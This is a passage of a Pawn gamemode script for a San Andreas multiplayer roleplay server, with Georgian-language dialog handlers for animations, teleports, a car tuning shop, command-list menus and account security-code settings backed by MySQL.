				case 33: GoAnim(playerid,"benchpress","gym_bp_celebrate",4.1,1,0,0,0,0,0);
				case 34: GoAnim(playerid,"LOWRIDER","Rap_C_loop",4.1,1,0,0,0,0,0);
				case 35: GoAnim(playerid,"LOWRIDER","Rap_B_loop",4.1,1,0,0,0,0,0);
				case 36: GoAnim(playerid,"LOWRIDER","Rap_A_loop",4.1,1,0,0,0,0,0);
				case 37: GoAnim(playerid,"BSKTBALL","BBALL_idleloop",4.1,1,0,0,0,0,0);
				case 38: ApplyAnimation(playerid,"BSKTBALL","BBALL_Jump_Shot",4.1,0,0,0,0,0,1);
				case 39: ApplyAnimation(playerid,"BSKTBALL","BBALL_pickup",4.1,0,0,0,0,0,1);
				case 40: ApplyAnimation(playerid,"CAMERA","camstnd_cmon",4.1,0,0,0,0,0,1);
				case 41: GoAnim(playerid,"CAR","fixn_car_loop",4.1,1,0,0,0,0,0);
				case 42: GoAnim(playerid,"CAR_CHAT","car_talkm_loop",4.1,1,0,0,0,0,0);
				case 43: GoAnim(playerid,"COP_AMBIENT","coplook_loop",4.1,1,0,0,0,0,0);
				case 44: GoAnim(playerid,"CRACK","Bbalbat_Idle_01",4.1,1,0,0,0,0,0);
		        case 45: GoAnim(playerid,"CRACK","Bbalbat_Idle_02",4.1,1,0,0,0,0,0);
		        case 46: ApplyAnimation(playerid,"GHANDS","gsign1",4.1,0,0,0,0,0,1);
		        case 47: ApplyAnimation(playerid,"GHANDS","gsign2",4.1,0,0,0,0,0,1);
		        case 48: ApplyAnimation(playerid,"GHANDS","gsign3",4.1,0,0,0,0,0,1);
				case 49: ApplyAnimation(playerid,"GHANDS","gsign4",4.1,0,0,0,0,0,1);
				case 50: ApplyAnimation(playerid,"GHANDS","gsign5",4.1,0,0,0,0,0,1);
				case 51: ApplyAnimation(playerid,"GHANDS","gsign1LH",4.1,0,0,0,0,0,1);
				case 52: ApplyAnimation(playerid,"GHANDS","gsign2LH",4.1,0,0,0,0,0,1);
				case 53: ApplyAnimation(playerid,"GHANDS","gsign4LH",4.1,0,0,0,0,0,1);
				case 54: GoAnim(playerid,"GRAVEYARD","mrnF_loop",4.1,1,0,0,0,0,0);
				case 55: GoAnim(playerid,"MISC","seat_LR",4.1,1,0,0,0,0,0);
				case 56: GoAnim(playerid,"INT_HOUSE","Lou_in",4.1,0,1,1,1,1,0);
				case 57: GoAnim(playerid,"INT_OFFICE","OFF_sit_Bored_loop",4.1,1,0,0,0,0,0);
				case 58: GoAnim(playerid,"LOWRIDER","F_smklean_loop",4.1,1,0,0,0,0,0);
				case 59: ApplyAnimation(playerid,"MEDIC","CPR",4.1,0,0,0,0,0,1);
				case 60: GoAnim(playerid,"GANGS","LeanIn",4.1,0,1,1,1,1,0);
				case 61: GoAnim(playerid,"MISC","plyrlean_loop",4.1,1,0,0,0,0,0);
				case 62: ApplyAnimation(playerid,"MISC","plyr_shkhead",4.1,0,0,0,0,0,1);
				case 63: GoAnim(playerid,"MISC","scratchballs_01",4.1,1,0,0,0,0,0);
		    }
		    return true;
		}
		case dTeleport2:
		{
		    if(!response) return true;
		    switch(listitem)
		    {
		        case 0: {
		            if(PlayerToPoint(10.0,playerid,1765.3303,-1940.9227,13.5696)) return SendClientMessage(playerid,CGRAY,"Airchiet Tqventvis Sasurveli Sadguri.");
		        }
		        case 1: {
		            if(PlayerToPoint(10.0,playerid,-1970.7937,157.8173,27.6875)) return SendClientMessage(playerid,CGRAY,"Airchiet Tqventvis Sasurveli Sadguri.");
		        }
		        case 2: {
		            if(PlayerToPoint(10.0,playerid,2853.1799,1290.0969,11.3906)) return SendClientMessage(playerid,CGRAY,"Airchiet Tqventvis Sasurveli Sadguri.");
		        }
		    }
            if(GetPlayerMoneyEx(playerid) < 20) return SendClientMessage(playerid,CGRAY,"Arasakmarisi Tanxa. Aucilebelia $20");
			TransferMoney(playerid,-1,20);
		    SetPVarInt(playerid,"Busser",listitem);
			ClearAnimations(playerid);
			SetPlayerPos(playerid,83.0612,-329.6281,1094.8015);
			TogglePlayerControllable(playerid,0);
			SetCameraBehindPlayer(playerid);
			SetPlayerInterior(playerid,1);
 			SetPlayerVirtualWorld(playerid,playerid);
			InterpolateCameraPos(playerid, 86.106620, -332.949768, 1097.162475, 82.463966, -327.016143, 1096.421508, 8000);
   			InterpolateCameraLookAt(playerid, 82.487724, -329.893768, 1095.561035, 80.401756, -322.904022, 1094.462524, 8000);
 	    	SetTimerEx("OpenPoezd",2000,false,"i",playerid);
		}
		case dTeleport:
		{
		    if(!response) return true;
			switch(listitem)
			{
				case 0: SetPlayerPos(playerid, -88.5049,-308.9825,1.4297);
				case 1: SetPlayerPos(playerid, 2455.2207,1948.4336,10.2781);
				case 2: SetPlayerPos(playerid, 2139.2783,-1990.9692,13.5469);
				case 3: SetPlayerPos(playerid, 1484.0745,-1742.9216,13.5469);
				case 4: SetPlayerPos(playerid, 1382.1483,-1088.7728,28.2118);
				case 5: SetPlayerPos(playerid, 2148.9377,-1484.8975,26.6240);
				case 6: SetPlayerPos(playerid, 2495.3943,-1691.1404,14.7656);
				case 7: SetPlayerPos(playerid, 2296.4370,-1882.2383,14.2344);
				case 8: SetPlayerPos(playerid, 2439.5891,-1357.1383,24.1005);
				case 9: SetPlayerPos(playerid, 1673.6681,-2122.4548,14.1460);
				case 10: SetPlayerPos(playerid, 1172.0792,-1323.3489,15.4030);
				case 11: SetPlayerPos(playerid, -2655.1638,639.8657,14.4545);
				case 12: SetPlayerPos(playerid, 1583.5775,1769.1208,10.8203);
				case 13: SetPlayerPos(playerid, 1542.5919,-1676.4452,13.5548);
				case 14: SetPlayerPos(playerid, -1605.0452,720.4929,11.8777);
				case 15: SetPlayerPos(playerid, 2286.6794,2426.7869,10.8203);
				case 16: SetPlayerPos(playerid, -507.4083,-499.2944,36.5762);
				case 17: SetPlayerPos(playerid, 2163.6724,2060.5046,10.8203);
				case 18: SetPlayerPos(playerid, 1797.4567,-1579.0215,14.0861);
				case 19: SetPlayerPos(playerid, 2224.8792,2522.1580,10.8203);
				case 20: SetPlayerPos(playerid, 271.8271,-2020.3104,1.4288);
				case 21: SetPlayerPos(playerid, 1227.8615,181.5498,20.4099);
				case 22: SetPlayerPos(playerid, 325.0884,-1515.3992,36.0325);
				case 23: SetPlayerPos(playerid, -2463.4446,131.7308,35.1719);
				case 24: SetPlayerPos(playerid, 2628.0029,2349.3127,10.8203);
				case 25: SetPlayerPos(playerid, 606.5971,-1459.5380,14.3969);
			}
			GameTextForPlayer(playerid,"~w~~n~~n~~n~~n~~n~~y~Teleport",3000,3); SetPlayerInterior(playerid,0); SetPlayerVirtualWorld(playerid,0);
		}
		case dStoRAK:
		{
		    if(!response) return true;
		    if(!PlayerToPoint(5.0,playerid,1015.3531,-1438.2787,13.5469) || !PlayerToPoint(5.0,playerid,2384.6409,1026.9692,10.8203) || !PlayerToPoint(5.0,playerid,-1917.2198,295.4781,41.0469)) return true;
		    switch(listitem)
		    {
		        case 0:
		        {
		            if(!pData[playerid][pCar] || !IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid,CGRAY,"Tqven Shegidzliat Mxolod Sakutari Manqanis Shegebva");
				    //ShowPlayerDialog(playerid,dStoRAK1,2,"Выберите цвет т.с","1.Белый\n{505050}2.Черный\n{"#cLIGHTBLUE"}3.Голубой\n{"#cRED"}4.Красный\n{"#cYELLOW"}5.Желтый\n{"#cBLUE"}6. Синий\n{"#cGRAY"}7.Серый\n{"#cPINK"}8. РозоВый\n{f5f5dc}9.БежеВый\n{ff00ff}10.Пурпурный","OK","Выход");
                    for(new i = 0; i < 11; i++) TextDrawShowForPlayer(playerid,ColorTD[i]);
				    new curcol;
				    for(new i = 0; i < 2; i++)
				    {
				        curcol = pData[playerid][pColor1];
				        PlayerTextDrawColor(playerid, ColorTDPl[playerid][2+3*i], RGBArray[curcol]);
						curcol--;
						if(curcol < 0) curcol = 255;
						PlayerTextDrawColor(playerid, ColorTDPl[playerid][1+3*i], RGBArray[curcol]);
						curcol += 2;
						if(curcol > 255) curcol = 0;
						PlayerTextDrawColor(playerid, ColorTDPl[playerid][3+3*i], RGBArray[curcol]);
				    }
				    for(new i = 0; i < 6; i++) PlayerTextDrawShow(playerid,ColorTDPl[playerid][1+i]);
				    //TextDrawShowForPlayer(playerid,ColorTD[11+3]);
				    PrimaryColor[playerid] = pData[playerid][pColor1];
					SecondaryColor[playerid] = pData[playerid][pColor2];
					RepaintValue[playerid] = 0;
					ChangedPrimaryColor[playerid] = false;
					ChangedSecondaryColor[playerid] = false;
					PlayerTextDrawSetString(playerid,ColorTDPl[playerid][0],"$0");
					PlayerTextDrawShow(playerid,ColorTDPl[playerid][0]);
					TextDrawShowForPlayer(playerid,ColorTD[15]);
					SelectTextDraw(playerid,CYELLOW);
				}
		        case 1:
				{
				    if(GetPlayerMoneyEx(playerid) < 100) return SendClientMessage(playerid,CGRAY,"Tqven Gaqvt Arasakmarisi Tanxa.");
					TransferMoney(-1,playerid,-100);
			 		RepairVehicle(GetPlayerVehicleID(playerid));
				}
				case 2:
				{
				    if(GetPlayerMoneyEx(playerid) < 1000) return SendClientMessage(playerid,CGRAY,"Tqven Gaqvt Arasakmarisi Tanxa.");
					ShowPlayerDialog(playerid,dStoRAK1,DIALOG_STYLE_LIST,"{"#cGREEN"}Administracia: {ffffff}Diskebi","1. Shadow\n2. Mega\n3. Wires\n4. Classic\n5. Twist\n6. Grove\n7. Atomic\n8. Dollar [Premium]\n9. Offroad\n10. Import\n11. Ahab\n12. Virtual\n13. Switch\n14. Cutter","Archeva","Gamortva");
				}
		    }
		}
		case dStoRAK1:
		{
		    if(!response) return true;
			switch(listitem)
			{
			    case 0:
			    {
			        pData[playerid][pKolesocar] = 1073;
				    AddVehicleComponent(GetPlayerVehicleID(playerid),1073);
			    }
			    case 1:
			    {
			        pData[playerid][pKolesocar] = 1074;
				    AddVehicleComponent(GetPlayerVehicleID(playerid),1074);
			    }
			    case 2:
			    {
			        pData[playerid][pKolesocar] = 1076;
				    AddVehicleComponent(GetPlayerVehicleID(playerid),1076);
			    }
			    case 3:
			    {
			        pData[playerid][pKolesocar] = 1077;
				    AddVehicleComponent(GetPlayerVehicleID(playerid),1077);
			    }
			    case 4:
			    {
			        pData[playerid][pKolesocar] = 1078;
				    AddVehicleComponent(GetPlayerVehicleID(playerid),1078);
			    }
			    case 5:
			    {
			        pData[playerid][pKolesocar] = 1081;
				    AddVehicleComponent(GetPlayerVehicleID(playerid),1081);
			    }
			    case 6:
			    {
			        pData[playerid][pKolesocar] = 1085;
				    AddVehicleComponent(GetPlayerVehicleID(playerid),1085);
			    }
			    case 7:
			    {
			        pData[playerid][pKolesocar] = 1083;
				    AddVehicleComponent(GetPlayerVehicleID(playerid),1083);
			    }
			    case 8:
			    {
			        pData[playerid][pKolesocar] = 1025;
				    AddVehicleComponent(GetPlayerVehicleID(playerid),1025);
			    }
			    case 9:
			    {
			        pData[playerid][pKolesocar] = 1082;
				    AddVehicleComponent(GetPlayerVehicleID(playerid),1082);
			    }
			    case 10:
			    {
			        pData[playerid][pKolesocar] = 1096;
				    AddVehicleComponent(GetPlayerVehicleID(playerid),1096);
			    }
			    case 11:
			    {
			        pData[playerid][pKolesocar] = 1097;
				    AddVehicleComponent(GetPlayerVehicleID(playerid),1097);
			    }
			    case 12:
			    {
			        pData[playerid][pKolesocar] = 1080;
				    AddVehicleComponent(GetPlayerVehicleID(playerid),1080);
			    }
			    case 13:
			    {
			        pData[playerid][pKolesocar] = 1079;
				    AddVehicleComponent(GetPlayerVehicleID(playerid),1079);
			    }
			}
			for(new i=5;i<8;i++)
			{
			    gBusiness[i][busiProduct] -= 20;
				gBusiness[i][busiBank] += 100;
				UpdateBusinessData(i,"product",gBusiness[i][busiProduct]);
				UpdateBusinessData(i,"bank",gBusiness[i][busiBank]);
			}
			SendClientMessage(playerid,CGREEN,"Tqven Warmatebit Daayenet Diski");
		    UpdatePlayerData(playerid,"kolesocar",pData[playerid][pKolesocar]);
   			PlayerPlaySound(playerid, 1052, 0.0, 0.0, 0.0);
   			TransferMoney(playerid,-1,1000);
   			ShowSTODialog(playerid);
		}
		case dPlayerMenu:
		{
			if(!response) return true;
			switch(listitem)
			{
				case 0: ShowPlayerDialog(playerid,dCommandList,2,"{ffff00}Mtavari C.M.D-ebi","1. Yvela C.M.D\n2. Samushaostvis C.M.D\n3. Chatis C.M.D\n4. Saxlistvis\n5. Biznesistvis\n6. Praqciis C.M.D\n7. Lideristvis\n8. Sheni Sheqmnili Organizaciistvis","Gagrdzeleba","Gamosvla");
				case 1:
				{
					if(pData[playerid][pMut]) return SendClientMessage(playerid,CGRAY,"Tqven Axla Arshegildziat Shetyobinebis Gagzavna.");
					if(reporti == 0) return SendClientMessage(playerid, COLOR_WHITE, "REPORTI GATISHULIA ADMINIS MIER");
				 	ShowPlayerDialog(playerid,dReport,1,"{"#cGREEN"}Difficult Stage Real Life Project: {ffffff}REPORT","{ffffff}Sheiyvanet Texti Administraciastan Gasagzavnad.\n{B2A6A6}Shetyobineba Gadaecema Dauyonebliv, Daelodet Pasuxs.","Gagrdzeleba","Daxurva");
				}
				case 2: ShowPlayerDialog(playerid,dPlayerMenuSecurity,2,"Damcavi","1. Sheiyvanet Paroli\n2. Damcavi Parloli","ОК","CLOSE");
				case 3: OnPlayerCommandText(playerid,"/donate");
			}
		}
		case dCommandList:
		{
			if(!response) return true;
			new mes2[900];
			switch(listitem)
			{
				case 0:
				{
					strcat(mes2,"{"#cWHITE"}/lock - Daketva / Gageba (Manqanac).\n");
					strcat(mes2,"/pass - Anaxe Pasporti.\n");
					strcat(mes2,"/diplomas - Anaxe Ganatleba.\n");
					strcat(mes2,"/skill - Anaxe Skilebi.\n");
					strcat(mes2,"/lic - Anaxe Licenzia\n");
					strcat(mes2,"/pay - Fulis Micema.\n");
					strcat(mes2,"/clothes - Tansacmlis Chacma.\n");
					strcat(mes2,"/givecloth - Tansacmlis Micema.\n");
					strcat(mes2,"/giveammo - Tyviebis Micema.\n");
					strcat(mes2,"/givemetall - Metalis Micema.\n");
					strcat(mes2,"/givegrain - Nergis Micema.\n");
					strcat(mes2,"/givedrugs - Narkotikis Micema.\n");
					strcat(mes2,"/givegun - Iaragis Micema.\n");
					strcat(mes2,"/togphone - Telefonis Chartva. / Gamortva. \n");
					strcat(mes2,"/createorg - Un.Off Fraqciis Sheqmna.\n");
					strcat(mes2,"/leave - Organizaciidan Gasvla.\n");
					strcat(mes2,"/divorce - Ganqorwineba.\n");
					strcat(mes2,"/wedding - Daqorwineba.\n");
					strcat(mes2,"/leaders - Liderebi.\n");
					strcat(mes2,"/anim - Animaciebi.\n");
					strcat(mes2,"/bomba - Bombis Dadeba.\n");
					strcat(mes2,"/fill - Benzinis Shevseba.\n");
					strcat(mes2,"/number - Motamashis Nomeri.\n");
					strcat(mes2,"/с(/call) - Darekva.\n");
					strcat(mes2,"/sms - SMS Gagzavna.\n");
					strcat(mes2,"/bullpen - Naxet Cixis Dro.\n");
					strcat(mes2,"/radio - Radios Chartva. / Gamortva.\n");
					strcat(mes2,"/ad - Reklamis Gagzavna.\n");
					strcat(mes2,"/id - ID Gageba.\n");
					ShowPlayerDialog(playerid,dCommandShow,0,"Commands",mes2,"OK","");
				}
				case 1:
				{
					strcat(mes2,"{"#cINFO"}[!] Taqsis Mdzgoli\n");
					strcat(mes2,"{"#cWHITE"}/taxi - Adgilis Motxovna.\n");
					strcat(mes2,"/untaxi - Adgilis Gaqroba.\n");
					strcat(mes2,"/fare - Fasis Dayeneba.\n");
					strcat(mes2,"{"#cINFO"}[!] Meqaniki\n");
					strcat(mes2,"{"#cWHITE"}/tow - Manqanis Chabma.\n");
					strcat(mes2,"/untow - Manqanis Moxsna.\n");
					strcat(mes2,"/repair - Garemonteba.\n");
					strcat(mes2,"/unfill - Benzinis Sistemis Gasuftaveba.\n");
					ShowPlayerDialog(playerid,dCommandShow,0,"Commands",mes2,"OK","");
				}
				case 2:
				{
					strcat(mes2,"{"#cWHITE"}/b - ООС Chati.\n");
					strcat(mes2,"/me - Moqmedebis Chati.\n");
					strcat(mes2,"/do - Mesame Saxis Chati.\n");
					strcat(mes2,"/try - Cda (Chati).\n");
					strcat(mes2,"/s - Yvirili.\n");
					ShowPlayerDialog(playerid,dCommandShow,0,"Commands",mes2,"OK","");
				}
				case 3:
				{
					strcat(mes2,"{"#cWHITE"}/home - Saxlis Martva.\n");
					strcat(mes2,"{"#cWHITE"}/exit - Saxlidan Gasvla.\n");
					strcat(mes2,"/sellhouse ([ID]) Saxlis Gayidva.\n");
					strcat(mes2,"/sellcar - Manqanis Gayidva.\n");
					strcat(mes2,"/settle - Shestavazet Tqven Saxlshi Cxovreba.\n");
					strcat(mes2,"/evict - Gaagdet Saxlidan.\n");
					strcat(mes2,"/evicting - Saxlidan Gamosaxleba.\n");
					strcat(mes2,"/residents - Macxovreblebis Sia.\n");
					strcat(mes2,"/store - Shkapis Martva.\n");
					strcat(mes2,"/fixcar - Manqanis Gachena.");
					ShowPlayerDialog(playerid,dCommandShow,0,"Commands",mes2,"OK","");
				}
				case 4:
				{
					strcat(mes2,"{"#cWHITE"}/business - Biznesis Martva.\n");
					strcat(mes2,"/sellbusiness - Biznesis Gayidva.\n");
					ShowPlayerDialog(playerid,dCommandShow,0,"Commands",mes2,"OK","");
				}
				case 5:
				{
					if(pData[playerid][pFraction] == 9 || pData[playerid][pFraction] == 11)
					{
						strcat(mes2,"{"#cWHITE"}/r - Racia.\n");
						strcat(mes2,"/d - DePartamenttan Kavshiri.\n");
						strcat(mes2,"/gotome - Wayvana.\n");
						strcat(mes2,"/clear - Gawmenda.\n");
						strcat(mes2,"/frisk - Gachxrikva.\n");
						strcat(mes2,"/wanted - Dzebnilta Sia.\n");
						strcat(mes2,"/takelic - Licenziebis Wartmeva.\n");
						strcat(mes2,"/takedrugs - Narkotikis Wartmeva.\n");
						strcat(mes2,"/suspect(/su) - Danashaulis Dadeba.\n");
						strcat(mes2,"/tazer - Gashesheba.\n");
						strcat(mes2,"/find - Povna.\n");
						strcat(mes2,"/cuff - Borkilebis Dadeba.\n");
						strcat(mes2,"/uncuff - Borkilebis Moxsna.\n");
						strcat(mes2,"/tyrma - Dapatimreba.\n");
						strcat(mes2,"/push - Manqanashi Chajena.\n");
						strcat(mes2,"/m - Megafoni.\n");
						strcat(mes2,"/loadgun - Chatvirtvis Dawyeba.\n");
						strcat(mes2,"/unloadgun - Chatvirtvis Dasruleba.\n");
						strcat(mes2,"/setspawn - Spawn Adgili.\n");
						strcat(mes2,"/members - Organizaciis Wevrebis Sia.\n");
						strcat(mes2,"/offmembers - Gasuli Organizaciis Wevrebi.\n");

					}
					else if(pData[playerid][pFraction] == 8)
					{
						strcat(mes2,"{"#cWHITE"}/r - Racia.\n");
						strcat(mes2,"/d - Departamenttan Kavshiri.\n");
						strcat(mes2,"/loadgun - Chatvirtvis Dawyeba.\n");
						strcat(mes2,"/unloadgun - Chatvirtvis Dasruleba.\n");
						strcat(mes2,"/setspawn - Spawn Adgili.\n");
						strcat(mes2,"/members - Organizaciis Wevrebis Sia.\n");
						strcat(mes2,"/offmembers - Gasuli Organizaciis Wevrebi.\n");
					}
					else if(pData[playerid][pFraction] >= 3 && pData[playerid][pFraction] <= 7)
					{
						strcat(mes2,"{"#cWHITE"}/r - Racia.\n");
						strcat(mes2,"/loadgun - Chatvirtvis Dawyeba.\n");
						strcat(mes2,"/unloadgun - Chatvirtvis Dasruleba.\n");
						strcat(mes2,"/gob - Obshiaki.\n");
						strcat(mes2,"/gangjob - Davaleba.\n");
						strcat(mes2,"/capture - Teritoriis Dapyroba.\n");
						strcat(mes2,"/sellgun - Iaragis Gayidva.\n");
						strcat(mes2,"/bangam -  Bendena.\n");
						strcat(mes2,"/grespawn - Transportis Darespawneba.\n");
						strcat(mes2,"/givekey - Saxlis Gasagebis Micema.\n");
						strcat(mes2,"/setspawn - Spawn Adgili.\n");
						strcat(mes2,"/members - Organizaciis Wevrebis Sia.\n");
						strcat(mes2,"/offmembers - Gasuli Organizaciis Wevrebi.\n");
					}
					else if(pData[playerid][pFraction] >= 12 && pData[playerid][pFraction] <= 14)
					{
					    strcat(mes2,"{"#cWHITE"}/r - Racia.\n");
					    strcat(mes2,"/takephone - Telefonis Chamortmeva.\n");
					    strcat(mes2,"/bizwar - Strelkis Danishnva.\n");
					    strcat(mes2,"/bizlist - Biznesebis Sia.\n");
					    strcat(mes2,"/mafiajob - Davaleba.\n");
						strcat(mes2,"/members - Organizaciis Wevrebis Sia.\n");
						strcat(mes2,"/offmembers - Gasuli Organizaciis Wevrebi.\n");
						strcat(mes2,"/setspawn - Spawn Adgili.\n");
					}
					else if(pData[playerid][pFraction] == 10)
					{
						strcat(mes2,"{"#cWHITE"}/r - Racia.\n");
						strcat(mes2,"/adlist - Reklamebis Gadaxedva.\n");
						strcat(mes2,"/ether - Eteri.\n");
						strcat(mes2,"/dial - Zaris Migeba Etershi.\n");
						strcat(mes2,"/hdial - Eteris Dapauzeba.\n");
						strcat(mes2,"/stopdial - Zarebis Migebis Gatishva.\n");
						strcat(mes2,"/nmoney - Organizaciis Balansi.\n");
						strcat(mes2,"/ngetmoney - Organizaciis Balansidan Fulis Ageba.\n");
						strcat(mes2,"/setspawn - Spawn Adgili.\n");
						strcat(mes2,"/members - Organizaciis Wevrebis Sia.\n");
						strcat(mes2,"/offmembers - Gasuli Organizaciis Wevrebi.\n");
					}
					else if(pData[playerid][pFraction] == 15)
					{
					    strcat(mes2,"{"#cWHITE"}/r - Racia.\n");
					    strcat(mes2,"/kazna - Meriis Biujeti.\n");
					    strcat(mes2,"/gov - Saxelmwipo Siaxleebis Gamoqveyneba.\n");
					    strcat(mes2,"/d - Departamenttan Kavshiri.\n");
					    strcat(mes2,"/members - Organizaciis Wevrebis Sia.\n");
						strcat(mes2,"/offmembers - Gasuli Organizaciis Wevrebi.\n");
						strcat(mes2,"/setspawn - Spawn Adgili.\n");
					}
					else if(pData[playerid][pFraction] == 1)
					{
						strcat(mes2,"{"#cWHITE"}/r - Racia.\n");
						strcat(mes2,"/givelic - Licenziebis Micema.\n");
						strcat(mes2,"/members - Organizaciis Wevrebis Sia.\n");
						strcat(mes2,"/offmembers - Gasuli Organizaciis Wevrebi.\n");
						strcat(mes2,"/setspawn - Spawn Adgili.\n");
					}
					else if(pData[playerid][pFraction] == 2)
					{
						strcat(mes2,"{"#cWHITE"}/r - Racia.\n");
						strcat(mes2,"/d - Deparatamenttan Kavshiri.\n");
						strcat(mes2,"/heal - Sicocxlis Momateba.\n");
						strcat(mes2,"/members - Organizaciis Wevrebis Sia.\n");
						strcat(mes2,"/setspawn - Swpawn Adgili.\n");
						strcat(mes2,"/offmembers - Gasuli Organizaciis Wevrebi.\n");
					}
					else
					{
						strcat(mes2,"{"#cWHITE"}Tqven Ar Xart Organizaciis Wevri.\n");
					}
					ShowPlayerDialog(playerid,dCommandShow,0,"Commands",mes2,"OK","");
				}
				case 6:
				{
					strcat(mes2,"{"#cWHITE"}/lmenu - Lideris Menu(Mxolod Bandistvis)\n");
					strcat(mes2,"/gov - Saxelmwifo Ambebi.\n");
					strcat(mes2,"/invite - Migeba.\n");
					strcat(mes2,"/uninvite - Gagdeba.\n");
					strcat(mes2,"/uninviteoff - OFF-Motamashis Gagdeba.\n");
					strcat(mes2,"/changeskin - Skinis Shecvla.\n");
					strcat(mes2,"/giverank - Rankis Aweva / Daweva.\n");
					strcat(mes2,"/subleader - SubLideris Danishvna.");
					ShowPlayerDialog(playerid,dCommandShow,0,"Commands",mes2,"OK","");
				}
				case 7:
				{
					strcat(mes2,"{"#cWHITE"}/or - Chati Un.Off Organizaciistvis.\n");
					strcat(mes2,"/ogiverank - Rankis Micema.\n");
					strcat(mes2,"/oinvite - Migeba.\n");
					strcat(mes2,"/ouninvite - Gagdeba.\n");
					strcat(mes2,"/oleave - Un.Off Organizaciis Datoveba.\n");
					strcat(mes2,"/omembers - Un.Off Organizaciis Wevrebi.\n");
					ShowPlayerDialog(playerid,dMes,0,"Commands",mes2,"OK","");
				}
			}
		}
		case dCommandShow: ShowPlayerDialog(playerid,dCommandList,2,"{ffff00}Mtavari C.M.D-ebi","1. Yvela C.M.D\n2. Samushaostvis C.M.D\n3. Chetis C.M.D\n4. Saxlistvis\n5. Biznesistvis\n6. Praqciis C.M.D\n7. Lideristvis\n8. Sheni Sheqmnili Organizaciistvis","Gagrdzeleba","Gamosvla");
		case dPlayerMenuSecurity:
		{
			if(!response) return OnPlayerCommandText(playerid, "/menu");
			switch(listitem)
			{
				case 0:
				{
					if(strlen(pData[playerid][pCode])) ShowPlayerDialog(playerid,dChangePassCode,3,"Parolis Shecvla","{"#cWHITE"}Miutitet Usaftxoebis Kodi","OK","CLOSE");
					else ShowPlayerDialog(playerid,dChangePassPass,3,"Parolis Shecvla","{"#cWHITE"}Miutite Sheni Dzveli Paroli","OK","CLOSE");
				}
				case 1: ShowCodeSettings(playerid);
			}
		}
		case dCode:
		{
			if(!response) return ShowPlayerDialog(playerid,dPlayerMenuSecurity,2,"Usaftxoeba","1. Shecvale Paroli\n2. Usaftxoebis Kodi","OK","CLOSE");
			switch(listitem)
			{
				case 0:
				{
					if(!strlen(pData[playerid][pCode])) ShowPlayerDialog(playerid,dCodeSet1,3,"Usaftxoebis Kodi","{"#cWHITE"}Miutitet Usaftxoebis Kodi","OK","BACK");
					else ShowPlayerDialog(playerid,dCodeChange1,3,"Usafrtxoebis Kodi","{"#cWHITE"}Miutite Sheni Dzveli Usaftxoebis Kodi","OK","BACK");
				}
				case 1:
				{
					if(!pData[playerid][pRequestCode])
					{
						if(!strlen(pData[playerid][pCode])) return ShowPlayerDialog(playerid,dCodeMes,0,"Usafrtxoebis Kodi","Tqven Pirvel Rigshi Unda Daayenot Usaftxoebis KODI","OK","");
						pData[playerid][pRequestCode] = 1;
					}
					else pData[playerid][pRequestCode] = 0;
					UpdatePlayerData(playerid,"requestcode",pData[playerid][pRequestCode]);
					ShowCodeSettings(playerid);
				}
			}
		}
		case dCodeMes: ShowCodeSettings(playerid);
		case dCodeSet1:
		{
			if(!response) return ShowPlayerDialog(playerid,dPlayerMenuSecurity,2,"Usaftxoeba","1. Shecvale Paroli\n2. Usaftxoebis Kodi\n3. E-Mail Misamartis Dadastureba\nTelefonis Nomeris Mibma","OK","CLOSE");
			if(strfind(inputtext,"|") != -1)
			{
				return SendClientMessage(playerid,CGRAY,"Tqven Parolshi Gamoikenet Akrdzaluli Simboloebi.");
			}
			new str[64];
			mysql_real_escape_string(inputtext,str);
			if(!strlen(str) && strlen(pData[playerid][pCode]))
			{
				new query[100];
				format(query,sizeof(query),"UPDATE `members` SET code = '', requestcode = '0' WHERE nickname = '%s'",Name2(playerid));
				mysql_empty(mysql, query);
				if(mysql_errno()) return SendClientMessage(playerid,CRED,"Shecdoma MySQL 1 (Washlili Code)");
				format(pData[playerid][pCode],MAX_PLAYER_NAME,"");
				pData[playerid][pRequestCode] = 0;
				SendClientMessage(playerid,CGREEN,"Usaprtxoebis Kodi Waishala.");
			}
			else if(strlen(str) < 6 || strlen(str) > 22)
			{
				SendClientMessage(playerid,CGRAY,"Textis Xangrdzlivoba Arunda Iyos 6-Ze Naklebi Da 22-Ze Meti.");
				ShowPlayerDialog(playerid,dCodeSet1,3,"Usafrtxoebis Kodi","{"#cWHITE"}Miutitet Axali Usafrtxoebis Kodi:","OK","BACK");
			}
			else
			{
				SetPVarString(playerid,"setcode",str);
				ShowPlayerDialog(playerid,dCodeSet2,3,"Usafrtxoebis Kodi","{"#cWHITE"}Gaimeoret Axali Usaftxoebis Kodi:","OK","CLOSE");
			}
		}
		case dCodeSet2:
		{
			new oldcode[25];
			GetPVarString(playerid,"setcode",oldcode,MAX_PLAYER_NAME);
			DeletePVar(playerid,"setcode");
			if(!response) return ShowPlayerDialog(playerid,dPlayerMenuSecurity,2,"Usafrtxoeba","1. Shecvale Paroli\n2. Usaftxoebis Kodi\n3. E-Mail Misamartis Dadastureba\nTelefonis Nomeris Mibma","OK","CLOSE");
			if(strfind(inputtext,"|") != -1) return SendClientMessage(playerid,CGRAY,"Tqven Parolshi Gamoikenet Akrdzaluli Simboloebi.");
			new str[64];
			mysql_real_escape_string(inputtext,str);
			if(!strcmp(str,oldcode,false) && strlen(str))
			{
				new query[128];
				format(query,sizeof(query),"UPDATE `members` SET code = '%s' WHERE nickname = '%s'",str,Name2(playerid));
				mysql_empty(mysql, query);
				if(mysql_errno()) return SendClientMessage(playerid,CRED,"Shecdoma MySQL 1 (смена кода)");
				format(pData[playerid][pCode],MAX_PLAYER_NAME,"%s",str);
				SendClientMessage(playerid,CGREEN,"Usafrtxoebis Kodi Sheicvala. Gtxovt Dawerot Is.");
			}
			else SendClientMessage(playerid,CGRAY,"Tqveni Sheyvanili Usafrtxoebis Kodi Ar Emtxveva");
		}
		case dCodeChange1:
		{
			if(!response) return ShowPlayerDialog(playerid,dPlayerMenuSecurity,2,"Usafrtxoeba","1. Shecvale Paroli\n2. Usaftxoebis Kodi\n3. E-Mail Misamartis Dadastureba\nTelefonis Nomeris Mibma","OK","CLOSE");
			if(!strcmp(inputtext,pData[playerid][pCode],false) && strlen(inputtext))
			{
				ShowPlayerDialog(playerid,dCodeSet1,3,"Usafrtxoebis Kodi","Miutitet Axali Usafrtxoebis Kodi. (Rom Gaauqmot Usafrtxoebis Kodi Datovet Veli Carieli)","OK","BACK");
			}
			else SendClientMessage(playerid,CGRAY,"Usafrtxoebis Kodi Sheyvanil Iqna Arasworad.");
		}
		case dChangePassCode:
		{
			if(!response) return true;
			if(!strcmp(inputtext,pData[playerid][pCode],false) && strlen(inputtext))
			{
